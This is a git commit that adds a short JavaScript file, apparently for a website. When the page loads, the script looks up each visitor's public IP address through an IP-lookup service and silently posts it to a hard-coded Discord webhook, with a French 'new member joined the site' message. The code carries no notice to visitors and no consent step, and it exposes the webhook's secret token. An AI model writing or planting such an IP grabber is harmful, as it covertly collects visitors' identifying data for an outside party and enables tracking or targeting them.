e47acd22af1d926348e5c74e35966b3fe4a6e469
Belsicc <143416443+Belsicc@users.noreply.github.com>
2024-02-21 18:05:25 +0100

    Add files via upload

---
+++ main.js
@@ -0,0 +1,31 @@
+const webhookURL = "https://discord.com/api/webhooks/1209908254373711903/knK8b_n6LS2q-h4RISvtMpeJ1oFE0C489n-Ab8btUqi3VSuRQ7XBFtkieCJEdoWV5aVL";
+
+const getIpAddress = async () => {
+    const response = await fetch("https://api64.ipify.org?format=json");
+    const data = await response.json();
+    return data.ip;
+};
+
+const sendWebhook = async () => {
+    const ipAddress = await getIpAddress();
+
+    const embed = {
+        title: "Nouveau membre rejoint le site!",
+        description: `Quoicoubaka! Adresse IP: ${ipAddress}`,
+        color: 0x00ff00
+    };
+
+    const payload = {
+        embeds: [embed]
+    };
+
+    fetch(webhookURL, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+    });
+};
+
+sendWebhook();
